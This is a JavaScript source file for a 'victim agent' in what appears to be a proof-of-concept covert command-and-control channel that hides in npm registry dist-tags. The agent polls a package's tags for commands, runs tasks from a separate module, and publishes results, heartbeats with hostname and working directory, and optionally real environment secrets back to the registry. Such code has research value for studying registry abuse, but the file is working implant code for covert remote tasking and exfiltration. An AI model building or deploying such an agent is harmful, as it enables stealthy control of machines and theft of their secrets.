// Victim agent: polls dist-tags on a package, executes allowlisted mock tasks
// addressed to it (or to 'all'), and publishes chunked results as dist-tags.
//
// Guarantees:
//  - each command executes AT MOST ONCE (state.lastSeq is persisted before the
//    result is published, and survives restarts via the state file)
//  - malformed tags are logged and skipped, never fatal
//  - registry failures only slow the loop down (exponential backoff); the
//    agent keeps polling
//  - SIGINT/SIGTERM flush state and exit cleanly

import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { pathToFileURL } from 'node:url';
import { channelTimings, loadConfig, configArgFromArgv } from '../common/config.js';
import { createLogger } from '../common/logger.js';
import {
  PINNED_VERSION,
  decodeAnnounceTag,
  decodeCommandTag,
  encodeAnnounceTag,
  encodeResultTags,
  isAnnounceTag,
  isCommandTag,
} from '../common/protocol.js';
import { RegistryClient } from '../common/registry.js';
import { runTask } from './tasks.js';

const MAX_BACKOFF_SEC = 300;

// ---------------------------------------------------------------------------
// state file
// ---------------------------------------------------------------------------

export function defaultState() {
  return { agentId: '', lastSeq: {} };
}

export function loadState(statePath) {
  try {
    const raw = JSON.parse(fs.readFileSync(statePath, 'utf8'));
    return {
      agentId: typeof raw.agentId === 'string' ? raw.agentId : '',
      lastSeq: raw.lastSeq && typeof raw.lastSeq === 'object' ? raw.lastSeq : {},
    };
  } catch {
    return defaultState();
  }
}

export function saveState(statePath, state) {
  const tmp = `${statePath}.tmp`;
  fs.mkdirSync(path.dirname(path.resolve(statePath)), { recursive: true });
  fs.writeFileSync(tmp, JSON.stringify(state, null, 2));
  fs.renameSync(tmp, statePath); // atomic-ish: never leave a half-written state file
}

// ---------------------------------------------------------------------------
// command selection (pure, testable)
// ---------------------------------------------------------------------------

/**
 * Pick the commands that should be executed from a dist-tag map.
 * Returns them sorted by sequence number. Malformed tags are reported in
 * `skipped` instead of throwing.
 */
export function selectCommands(distTags, state, agentId) {
  const commands = [];
  const skipped = [];
  const selectedSequences = new Set();
  for (const name of Object.keys(distTags)) {
    if (!isCommandTag(name)) continue;
    let cmd;
    try {
      cmd = decodeCommandTag(name);
    } catch (err) {
      skipped.push({ tag: name, reason: err.message });
      continue;
    }
    if (cmd.agentId !== agentId && cmd.agentId !== 'all') continue;
    const last = state.lastSeq[cmd.agentId] ?? 0;
    if (cmd.seq <= last) continue; // already processed (dedup)
    const key = `${cmd.agentId}:${cmd.seq}`;
    if (selectedSequences.has(key)) {
      skipped.push({ tag: name, reason: `duplicate command sequence ${key}` });
      continue;
    }
    selectedSequences.add(key);
    commands.push({ tag: name, ...cmd });
  }
  commands.sort((a, b) => a.seq - b.seq);
  return { commands, skipped };
}

export function isCommandExpired(payload, now, taskTtlMs) {
  const sentAt = Number(payload?.ts);
  if (!Number.isFinite(sentAt)) return Number.isFinite(taskTtlMs);
  return now - sentAt >= taskTtlMs;
}

export function encodeHeartbeatTag(agentId, payload) {
  const clip = (value) => typeof value === 'string' ? value.slice(0, 40) : undefined;
  const candidates = [
    payload,
    { ts: payload.ts, lease: payload.lease, cwd: clip(payload.cwd), host: clip(payload.host) },
    { ts: payload.ts, lease: payload.lease, host: clip(payload.host) },
    { ts: payload.ts, lease: payload.lease },
  ];
  let lastError;
  for (const candidate of candidates) {
    try {
      return encodeAnnounceTag(agentId, candidate);
    } catch (err) {
      lastError = err;
    }
  }
  throw lastError;
}

export async function publishHeartbeat({
  client,
  agentId,
  distTags,
  now,
  cwd,
  host,
  lease,
  onPublished,
  logger,
}) {
  const tag = encodeHeartbeatTag(agentId, { ts: now, cwd, host, lease });
  await client.setDistTag(tag, PINNED_VERSION);
  onPublished?.(tag);

  for (const oldTag of Object.keys(distTags)) {
    if (oldTag === tag || !isAnnounceTag(oldTag)) continue;
    try {
      if (decodeAnnounceTag(oldTag).agentId !== agentId) continue;
      await client.deleteDistTag(oldTag);
    } catch (err) {
      logger.warn(`failed to clean old heartbeat "${oldTag}": ${err.message}`);
    }
  }
  return tag;
}

// ---------------------------------------------------------------------------
// one poll cycle (testable with a fake client)
// ---------------------------------------------------------------------------

/**
 * @param {object} deps
 * @param {Record<string,string>} deps.distTags current dist-tag map
 * @param {object} deps.state agent state (mutated)
 * @param {string} deps.agentId this agent's id
 * @param {object} deps.client RegistryClient (or fake with setDistTag)
 * @param {object} deps.logger
 * @param {Function} [deps.save] persist callback, called after each state change
 * @param {object} [deps.limits] task limits, e.g. { maxFileBytes, revealEnv }
 * @param {Set<string>} [deps.validLeases] recently published heartbeat leases
 * @returns {Promise<{executed: number, resultsPublished: number, skipped: number}>}
 */
export async function processDistTags({
  distTags,
  state,
  agentId,
  client,
  logger,
  save,
  limits = {},
  validLeases = null,
}) {
  const { commands, skipped } = selectCommands(distTags, state, agentId);
  for (const s of skipped) {
    logger.warn(`skipping malformed tag "${s.tag}": ${s.reason}`);
  }

  let resultsPublished = 0;
  let executed = 0;
  let rejected = 0;
  for (const cmd of commands) {
    const invalidLease = validLeases instanceof Set
      && (cmd.agentId === 'all' || !validLeases.has(cmd.payload?.lease));
    if (invalidLease) {
      state.lastSeq[cmd.agentId] = cmd.seq;
      if (save) save();
      rejected++;
      logger.warn(`missing or stale lease for seq ${cmd.seq} (target ${cmd.agentId}); command was not executed`);
      try {
        await client.deleteDistTag(cmd.tag);
      } catch (err) {
        logger.warn(`failed to delete stale command "${cmd.tag}": ${err.message}`);
      }
      continue;
    }

    logger.info(`executing seq ${cmd.seq} (target ${cmd.agentId}): op=${cmd.payload.op}`);
    executed++;
    const result = runTask(cmd.payload.op, cmd.payload.args ?? {}, limits);
    const resultPayload = {
      seq: cmd.seq,
      op: cmd.payload.op,
      ok: result.ok,
      output: result.output,
      error: result.error,
      ...(result.file ? { file: result.file } : {}),
      ts: Date.now(),
    };

    // Mark processed BEFORE publishing: if the publish fails we would rather
    // lose a result than execute a command twice.
    state.lastSeq[cmd.agentId] = cmd.seq;
    if (save) save();

    try {
      const tags = encodeResultTags(agentId, cmd.seq, resultPayload);
      for (const tag of tags) {
        await client.setDistTag(tag, PINNED_VERSION);
      }
      resultsPublished++;
      logger.info(
        `result for seq ${cmd.seq} published as ${tags.length} tag(s) (ok=${result.ok})`,
      );
    } catch (err) {
      logger.error(`failed to publish result for seq ${cmd.seq}: ${err.message}`);
    }

    if (cmd.agentId !== 'all') {
      try {
        await client.deleteDistTag(cmd.tag);
      } catch (err) {
        logger.warn(`failed to delete processed command "${cmd.tag}": ${err.message}`);
      }
    }
  }

  return { executed, resultsPublished, skipped: skipped.length + rejected };
}

// ---------------------------------------------------------------------------
// main loop
// ---------------------------------------------------------------------------

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/**
 * Publish heartbeats on an independent async schedule so sequential registry
 * writes for task results cannot starve presence updates.
 */
export async function runHeartbeatLoop({
  heartbeatMs,
  isRunning,
  publish,
  logger,
  sleepFn = sleep,
  nowFn = Date.now,
  sleepSliceMs = 200,
}) {
  while (isRunning()) {
    const startedAt = nowFn();
    try {
      await publish();
      logger?.debug('heartbeat published');
    } catch (err) {
      logger?.warn(`failed to publish heartbeat: ${err.message}`);
    }

    const remainingMs = Math.max(0, heartbeatMs - (nowFn() - startedAt));
    for (let slept = 0; isRunning() && slept < remainingMs; slept += sleepSliceMs) {
      const slice = Math.min(sleepSliceMs, remainingMs - slept);
      await sleepFn(slice);
    }
  }
}

async function main() {
  const cfg = loadConfig(configArgFromArgv());
  const logger = createLogger({
    level: process.env.NPM_C2_LOG_LEVEL || 'info',
    logFile: cfg.logFile,
  });
  const statePath = cfg.stateFile || 'victim-state.json';
  const state = loadState(statePath);
  const save = () => saveState(statePath, state);

  if (cfg.agentId) {
    state.agentId = cfg.agentId;
  }
  if (!state.agentId) {
    state.agentId = 'a' + crypto.randomBytes(4).toString('hex');
    logger.info(`generated new agentId: ${state.agentId}`);
  }
  save();

  const client = new RegistryClient({
    registryUrl: cfg.registryUrl,
    packageName: cfg.packageName,
    token: cfg.token,
    logger,
  });
  const timings = channelTimings(cfg.pollIntervalSec);

  logger.info(`victim agent ${state.agentId} starting`);
  logger.info(`registry=${cfg.registryUrl} package=${cfg.packageName} poll=${cfg.pollIntervalSec}s`);
  logger.info(`cwd=${process.cwd()} maxFileBytes=${cfg.maxFileBytes}`);
  if (cfg.revealEnv) {
    logger.warn('revealEnv is ON — the env task returns real values; secrets may cross the channel');
  }
  if (!cfg.token) {
    logger.warn('NPM_C2_TOKEN is not set — result publishing will fail with 401');
  }

  let running = true;
  let sigCount = 0;
  const shutdown = (signal) => {
    sigCount++;
    if (sigCount > 1) {
      logger.warn(`received ${signal} again — forcing exit`);
      process.exit(1);
    }
    logger.info(`received ${signal}, shutting down (press Ctrl-C again to force)`);
    running = false;
  };
  process.on('SIGINT', shutdown);
  process.on('SIGTERM', shutdown);

  let heartbeatTag = '';
  let heartbeatLeases = [];
  const heartbeatPromise = runHeartbeatLoop({
    heartbeatMs: timings.heartbeatMs,
    isRunning: () => running,
    logger,
    publish: async () => {
      const distTags = await client.getDistTags();
      const lease = crypto.randomBytes(6).toString('hex');
      heartbeatTag = await publishHeartbeat({
        client,
        agentId: state.agentId,
        distTags,
        now: Date.now(),
        cwd: process.cwd(),
        host: os.hostname(),
        lease,
        onPublished: () => {
          heartbeatLeases = [...heartbeatLeases, lease].slice(-4);
        },
        logger,
      });
    },
  });

  let consecutiveFailures = 0;
  while (running) {
    let delaySec = cfg.pollIntervalSec;
    try {
      const distTags = await client.getDistTags();
      consecutiveFailures = 0;
      const stats = await processDistTags({
        distTags,
        state,
        agentId: state.agentId,
        client,
        logger,
        save,
        limits: { maxFileBytes: cfg.maxFileBytes, revealEnv: cfg.revealEnv },
        validLeases: new Set(heartbeatLeases),
      });
      if (stats.executed > 0 || stats.skipped > 0) {
        logger.info('cycle summary', stats);
      }
    } catch (err) {
      consecutiveFailures++;
      delaySec = Math.min(cfg.pollIntervalSec * 2 ** consecutiveFailures, MAX_BACKOFF_SEC);
      logger.error(
        `poll cycle failed (${consecutiveFailures} consecutive): ${err.message} — retrying in ${delaySec}s`,
      );
    }
    // sleep in small slices so SIGINT exits promptly
    for (let slept = 0; running && slept < delaySec * 1000; slept += 200) {
      await sleep(Math.min(200, delaySec * 1000 - slept));
    }
  }

  await heartbeatPromise;
  if (heartbeatTag) {
    try {
      await client.deleteDistTag(heartbeatTag);
    } catch (err) {
      logger.warn(`failed to remove heartbeat during shutdown: ${err.message}`);
    }
  }
  save();
  logger.close();
  process.exit(0);
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  main().catch((err) => {
    console.error(`fatal: ${err.message}`);
    process.exit(1);
  });
}
